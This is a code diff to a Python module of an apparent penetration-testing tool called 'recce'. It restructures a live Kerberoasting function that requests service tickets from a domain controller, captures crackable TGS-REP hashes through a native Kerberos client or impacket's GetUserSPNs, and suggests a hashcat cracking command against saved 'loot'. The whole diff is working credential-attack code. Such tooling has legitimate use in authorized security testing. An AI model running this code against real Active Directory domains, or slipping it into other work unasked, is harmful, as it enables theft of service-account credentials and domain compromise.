@@ -815,25 +815,7 @@ def parse_secretsdump(output: str) -> list[dict]:
     return out
 
 
-def live_kerberoast(creds: dict, privileged: set | None = None) -> dict:
-    """Run impacket-GetUserSPNs -request and capture every TGS-REP hash.
-    Returns {ran, tool, command, output, hashes, findings, error}."""
-    privileged = {p.upper() for p in (privileged or set())}
-    tool = _kerb_tool("impacket-GetUserSPNs", "GetUserSPNs.py")
-    if not tool:
-        return {"ran": False, "error": "impacket-GetUserSPNs not installed",
-                "hashes": [], "findings": []}
-    target, flags, stdin_pw = _impacket_target(creds)
-    dc = creds.get("dc_ip") or ""
-    cmd = [tool, "-request", "-outputfile", "-"] + flags
-    if dc:
-        cmd += ["-dc-ip", dc]
-    cmd.append(target)
-    out, err = _run(cmd, stdin_data=stdin_pw, new_session=stdin_pw is not None)
-    if err:
-        return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
-                "hashes": [], "findings": [], "error": err}
-    hashes = parse_tgs(out)
+def _kerberoast_findings(hashes: list[dict], creds: dict, privileged: set) -> list[dict]:
     fs = []
     for h in hashes:
         priv = h["user"].upper() in privileged
@@ -850,8 +832,47 @@ def live_kerberoast(creds: dict, privileged: set | None = None) -> dict:
             "hashcat -m 13100 kerberoast.hash rockyou.txt   # captured hash saved to "
             "loot/kerberoast.hash",
             "Use a long random gMSA/managed password; minimise SPNs on user accounts."))
+    return fs
+
+
+def live_kerberoast(creds: dict, privileged: set | None = None) -> dict:
+    """Capture every TGS-REP hash. The roast runs on recce's stdlib Kerberos client
+    (native, no impacket - works against a Samba KDC where impacket-GetUserSPNs -request
+    trips on the authenticator checksum); impacket is only a fallback if the native path
+    captures nothing. Returns {ran, tool, command, output, hashes, findings, error}."""
+    privileged = {p.upper() for p in (privileged or set())}
+    dc = creds.get("dc_ip") or ""
+    # Native path: reuse credenum's discover(native LDAP / impacket LDAP) + native roast.
+    from . import credenum
+    key = "hash" if creds.get("is_hash") else "password"
+    ce = {"domain": creds.get("domain", ""), "username": creds.get("user", ""),
+          "dc_ip": dc, key: creds.get("secret", "")}
+    rows, _nerr = credenum.run_kerberoast(dc, ce)
+    native = [{"user": r["name"], "spn": r["spn"], "hash": r["hash"]}
+              for r in rows if str(r.get("hash", "")).startswith("$krb5tgs$")]
+    if native:
+        return {"ran": True, "tool": "recce (native RC4 Kerberoast)",
+                "command": f"native kerberoast vs {dc}", "output": "",
+                "hashes": native, "findings": _kerberoast_findings(native, creds, privileged),
+                "error": None}
+    # Fallback: impacket-GetUserSPNs -request.
+    tool = _kerb_tool("impacket-GetUserSPNs", "GetUserSPNs.py")
+    if not tool:
+        return {"ran": False, "error": "impacket-GetUserSPNs not installed",
+                "hashes": [], "findings": []}
+    target, flags, stdin_pw = _impacket_target(creds)
+    cmd = [tool, "-request", "-outputfile", "-"] + flags
+    if dc:
+        cmd += ["-dc-ip", dc]
+    cmd.append(target)
+    out, err = _run(cmd, stdin_data=stdin_pw, new_session=stdin_pw is not None)
+    if err:
+        return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
+                "hashes": [], "findings": [], "error": err}
+    hashes = parse_tgs(out)
     return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
-            "hashes": hashes, "findings": fs, "error": None}
+            "hashes": hashes, "findings": _kerberoast_findings(hashes, creds, privileged),
+            "error": None}
 
 
 def live_asrep(creds: dict) -> dict:
